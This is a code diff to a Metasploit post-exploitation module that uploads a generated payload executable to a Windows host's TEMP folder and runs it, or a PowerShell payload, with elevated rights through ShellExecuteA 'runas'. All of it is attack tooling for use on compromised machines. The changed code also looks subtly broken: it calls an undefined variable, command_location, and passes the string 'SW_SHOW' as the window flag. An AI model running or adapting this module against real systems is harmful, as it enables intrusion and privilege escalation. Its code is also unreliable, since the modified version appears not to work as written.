@@ -10,31 +10,31 @@ module Msf::Post::Windows::Runas
   include Msf::Exploit::Powershell
 
   def execute_exe(filename=nil, path=nil, upload=nil)
-    exe_payload = generate_payload_exe
     payload_filename = filename || Rex::Text.rand_text_alpha((rand(8)+6)) + ".exe"
     payload_path = path || get_env('TEMP')
     cmd_location = "#{payload_path}\\#{payload_filename}"
 
     if upload
+      exe_payload = generate_payload_exe
       print_status("Uploading #{payload_filename} - #{exe_payload.length} bytes to the filesystem...")
       write_file(cmd_location, exe_payload)
     else
-      print_error("No Upload Path!")
-      return
+      print_status("No file uploaded, attempting to execute #{cmd_location}...")
     end
 
-    command = cmd_location
-    shell_exec(command, nil)
+    shell_exec(command_location, nil)
   end
 
   def execute_psh
-    command,args = "cmd.exe", " /c #{cmd_psh_payload(payload.encoded)}"
-    shell_exec(command,args)
+    powershell_command = cmd_psh_payload(payload.encoded)
+    command = 'cmd.exe'
+    args = "/c #{powershell_command}"
+    shell_exec(command, args)
   end
 
   def shell_exec(command, args)
-    print_status("Executing elevated command!")
-    session.railgun.shell32.ShellExecuteA(nil, "runas", command, args, nil, 5)
+    print_status("Executing elevated command...")
+    session.railgun.shell32.ShellExecuteA(nil, 'runas', command, args, nil, 'SW_SHOW')
   end
 end
 
